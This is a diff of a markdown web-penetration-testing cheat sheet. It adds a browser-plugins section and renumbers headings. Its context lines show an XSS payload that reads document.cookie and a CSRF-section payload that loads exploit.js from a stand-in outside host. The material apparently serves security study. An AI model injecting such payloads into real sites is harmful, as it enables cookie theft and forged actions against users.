@@ -5,11 +5,12 @@ Overview
 1. - [Web Requests](#1---web-requests)
 2. - [Web Proxies](#2---web-proxies)
 3. - [Online Resources](#3---online-resources)
-4. - [Sensitive Data Exposure](#4---sensitive-data-exposure)
-5. - [HTML Injection](#5---html-injection)
-6. - [Cross-Site Scripting (XSS)](#6---cross-site-scripting-xss)
-7. - [Cross-Site Request Forgery (CSRF)](#7---cross-site-request-forgery-csrf)
-8. - [Exploit Research](#8---exploit-research)
+4. - [Browser Plugins](#4---browser-plugins)
+5. - [Sensitive Data Exposure](#5---sensitive-data-exposure)
+6. - [HTML Injection](#6---html-injection)
+7. - [Cross-Site Scripting (XSS)](#7---cross-site-scripting-xss)
+8. - [Cross-Site Request Forgery (CSRF)](#8---cross-site-request-forgery-csrf)
+9. - [Exploit Research](#9---exploit-research)
 
    
 #1. - Web Requests
@@ -80,7 +81,28 @@ https://htmlg.com/html-editor/
 https://jsfiddle.net/
 ```
 
-#4. - Sensitive Data Exposure
+#4. - Browser Plugins
+-----------------------------------------
+
+- Wappalyzer: Website technology analyser
+
+```
+https://addons.mozilla.org/en-US/firefox/addon/wappalyzer/
+```
+
+- Cookie Editor: edit cookies
+
+```
+https://addons.mozilla.org/en-US/firefox/addon/cookie-editor/
+```
+
+- FoxyProxy: proxy management
+
+```
+https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/
+```
+
+#5. - Sensitive Data Exposure
 -----------------------------------------
 
 - Source Code
@@ -91,7 +113,7 @@ OR
 CTRL + U
 ```
 
-#5. - HTML Injection
+#6. - HTML Injection
 -----------------------------------------
 
 - Hyperlink
@@ -100,7 +122,7 @@ CTRL + U
 <a href="http://www.google.com">Click Me</a>
 ```
 
-#6. - Cross-Site Scripting (XSS)
+#7. - Cross-Site Scripting (XSS)
 -----------------------------------------
 
 *Reflected XSS	= Occurs when user input is displayed on the page after processing (e.g., search result or error message).*
@@ -115,7 +137,7 @@ CTRL + U
 #"><img src=/ onerror=alert(document.cookie)>
 ```
 
-#7. - Cross-Site Request Forgery (CSRF)
+#8. - Cross-Site Request Forgery (CSRF)
 -----------------------------------------
 
 - Password Change
@@ -124,7 +146,7 @@ CTRL + U
 "><script src=//www.example.com/exploit.js></script>
 ```
 
-#8. - Exploit Research
+#9. - Exploit Research
 -----------------------------------------
 
 - CVEdetails
